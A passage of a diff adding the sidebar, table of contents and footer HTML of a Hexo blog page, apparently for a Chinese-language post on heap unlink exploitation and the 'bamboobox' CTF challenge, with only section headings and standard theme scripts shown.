+                src="/images/avatar.jpg"
+                alt="N0vice" />
+            
+              <p class="site-author-name" itemprop="name">N0vice</p>
+              <p class="site-description motion-element" itemprop="description">从前我是瞎的，如今我看得见</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/N0vice21" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/luo-yu-piao" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-zhihu"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://spacey.top/" title="Elli0t" target="_blank">Elli0t</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.ericdshen.com/" title="EDS" target="_blank">EDS</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://migraine-sudo.github.io" title="Migraine" target="_blank">Migraine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://shawroot.cc/" title="Root" target="_blank">Root</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.yuque.com/pi3ntn/azmee3" title="Lime" target="_blank">Lime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://mrbelieve128.github.io/" title="Mr.Believe" target="_blank">Mr.Believe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://l0x1c.github.io/" title="L0x1c" target="_blank">L0x1c</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://binlep.top/" title="binlep" target="_blank">binlep</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://1p0ch.cn/" title="1p0ch" target="_blank">1p0ch</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://retr0.vip/" title="Retr_0" target="_blank">Retr_0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hackerpoet.com/" title="T4rn" target="_blank">T4rn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/SopRomeo" title="penson" target="_blank">penson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/lemon629/" title="lemon" target="_blank">lemon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://surager.pub/" title="5ur4g3r" target="_blank">5ur4g3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.snowywar.top/" title="snowywar" target="_blank">snowywar</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink简介"><span class="nav-number">1.</span> <span class="nav-text">unlink简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#保护机制介绍与绕过姿势"><span class="nav-number">2.</span> <span class="nav-text">保护机制介绍与绕过姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bamboobox"><span class="nav-number">3.</span> <span class="nav-text">bamboobox</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析"><span class="nav-number">3.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路"><span class="nav-number">3.2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">3.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接:</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">N0vice</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
